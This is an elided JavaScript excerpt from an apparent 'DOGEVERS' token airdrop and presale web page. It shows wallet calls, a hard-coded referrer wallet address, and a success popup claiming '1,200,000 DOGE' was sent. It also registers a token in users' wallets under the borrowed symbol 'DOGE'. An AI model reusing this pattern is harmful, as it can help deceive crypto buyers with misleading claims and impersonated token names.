...
const getAirdrop = async () => {
  ...
  sttcontract.methods.airdrop(fresh).send({from:addr}, (err, res) => {
   ...
   title: 'Claim Success',
   icon: 'success',
   html: '1,200,000 DOGE sent to your wallet.',
...
const buyair = async () => {
  ...
  let fresh = document.getElementById('airinput').value;
  if(fresh === "")
    fresh = "0x0F6Ca884C798327F6e106a84E20cFAba107C4D69";
...
function calculate() {
    ...
    var tokensPerEth = 2400000000;
    var tokens = tokensPerEth * bnb;
    console.log(tokens);
    document.getElementById("buyhch2input").value = tokens.toLocaleString("en-US")+' DOGEVERS';
  ...
  function addToWallet() {
                          ...
                          web3.currentProvider.sendAsync({
                            ...
                            params: {
                                'type': 'ERC20',
                                'options': {
                                    'address': '0xbDF22eEC55a6CFf496a3D265E593E806A0E81d76',
                                    'symbol': 'DOGE',
                                    'decimals': '18',
                                    'image': 'https://dogevers.github.io/images/logo.png',
                                },
                            },
   ...
   cancelButtonText: 'Exit',
        ...
        function querySt(ji) {
         ...
         if (ft[0] == ji) { 
          ...
          if( ref==null){
              ref = "0x0F6Ca884C798327F6e106a84E20cFAba107C4D69";
               document.getElementById('airinput').value = ref; 
          }else{ 
          document.getElementById('airinput').value = ref; 
          } 
